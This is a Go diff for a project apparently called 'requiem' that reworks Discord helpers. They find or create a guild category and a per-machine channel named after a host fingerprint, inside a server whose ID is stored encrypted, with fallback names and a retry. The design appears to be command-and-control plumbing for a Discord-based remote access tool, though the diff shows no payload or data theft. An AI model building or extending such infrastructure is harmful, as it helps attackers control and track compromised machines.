@@ -1,17 +1,22 @@
 package discord
 
 import (
+	"fmt"
 	"strings"
 
 	"requiem/funcs"
 	"requiem/store"
+	"requiem/utils"
 
 	"github.com/bwmarrin/discordgo"
 )
 
-const DEFAULT_CATEGORY_NAME string = "string2"
+const (
+	_DEFAULT_CATEGORY_NAME string = "string2"
+	_DEFAULT_CHANNEL_NAME  string = "nofina9"
+)
 
-func FindCategory(ses *discordgo.Session) (string, error) {
+func FindOrCreateFallbackCategory(ses *discordgo.Session) (string, error) {
 	channels, err := ses.GuildChannels(store.DecryptedServerID)
 	if err != nil {
 		return "", err
@@ -22,7 +27,7 @@ func FindCategory(ses *discordgo.Session) (string, error) {
 			continue
 		}
 
-		if strings.ToLower(channel.Name) != DEFAULT_CATEGORY_NAME {
+		if strings.ToLower(channel.Name) != _DEFAULT_CATEGORY_NAME {
 			continue
 		}
 
@@ -30,7 +35,7 @@ func FindCategory(ses *discordgo.Session) (string, error) {
 	}
 
 	channel, err := ses.GuildChannelCreateComplex(store.DecryptedServerID, discordgo.GuildChannelCreateData{
-		Name: DEFAULT_CATEGORY_NAME,
+		Name: _DEFAULT_CATEGORY_NAME,
 		Type: discordgo.ChannelTypeGuildCategory,
 	})
 
@@ -42,19 +47,22 @@ func FindCategory(ses *discordgo.Session) (string, error) {
 }
 
 // the 2nd return is if the channel was newly created
-func FindChannel(ses *discordgo.Session, categoryID string) (string, bool, error) {
+func FindOrCreateChannel(ses *discordgo.Session, categoryID string) (string, bool, error) {
 	channels, err := ses.GuildChannels(store.DecryptedServerID)
 	if err != nil {
 		return "", false, err
 	}
 
-	fingerprint, err := funcs.GenFingerprint()
-	if err != nil {
-		return "", false, err
+	hash, hmac := funcs.GenFingerprint()
+	if hash == "" || hmac == "" || store.DEBUG_MODE_USE_DEFAULT_CHANNEL_NAME {
+		utils.DebugLog(fmt.Sprintf("failed to generate fingerprint, using default channel name"))
+
+		hash = _DEFAULT_CHANNEL_NAME
+		hmac = _DEFAULT_CHANNEL_NAME
 	}
 
 	for _, channel := range channels {
-		if channel.Topic != fingerprint {
+		if channel.Topic != hash {
 			continue
 		}
 
@@ -70,8 +78,26 @@ func FindChannel(ses *discordgo.Session, categoryID string) (string, bool, error
 	}
 
 	channel, err := ses.GuildChannelCreateComplex(store.DecryptedServerID, discordgo.GuildChannelCreateData{
-		Name:     fingerprint,
-		Topic:    fingerprint,
+		Name:     hmac, // dont wanna shove the whole hash in the name, also, it checks only the topic
+		Topic:    hash,
+		Type:     discordgo.ChannelTypeGuildText,
+		ParentID: categoryID,
+	})
+
+	if err == nil {
+		return channel.ID, true, nil
+	}
+
+	utils.DebugLog(fmt.Sprint("failed to create channel, retrying with default category..."))
+
+	categoryID, err = FindOrCreateFallbackCategory(ses)
+	if err != nil {
+		return "", false, err
+	}
+
+	channel, err = ses.GuildChannelCreateComplex(store.DecryptedServerID, discordgo.GuildChannelCreateData{
+		Name:     hmac, // dont wanna shove the whole hash in the name, also, it checks only the topic
+		Topic:    hash,
 		Type:     discordgo.ChannelTypeGuildText,
 		ParentID: categoryID,
 	})
